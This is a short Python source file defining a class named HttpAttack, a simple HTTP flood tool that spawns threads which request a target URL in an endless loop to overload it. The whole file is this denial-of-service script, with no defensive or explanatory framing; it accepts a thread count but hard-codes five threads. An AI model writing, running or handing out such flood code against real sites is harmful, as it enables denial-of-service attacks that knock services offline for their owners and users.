import requests
import threading
import time
from debug import Debug

NOTE = Debug.NOTE()
WARN = Debug.WARN()
ERROR = Debug.ERROR()

class HttpAttack:
    def __init__(self, url, threading_count, sleep_time = None):
        self.url = url
        self.threading_count = threading_count
        self.sleep_time = sleep_time

    def attack(self):

        threads = []

        def begin():
            while True:
                try:
                    requests.get(self.url)
                    print(".", end="")
                    if self.sleep_time:
                        time.sleep(self.sleep_time)

                except Exception as error:
                    print(ERROR + "\n")
                    print(error)
                    continue

        # Threading function

        for i in range(5):
            thread = threading.Thread(target=begin)
            #thread.daemon = True
            thread.start()
            threads.append(thread)

        for t in threads:
            t.join()

        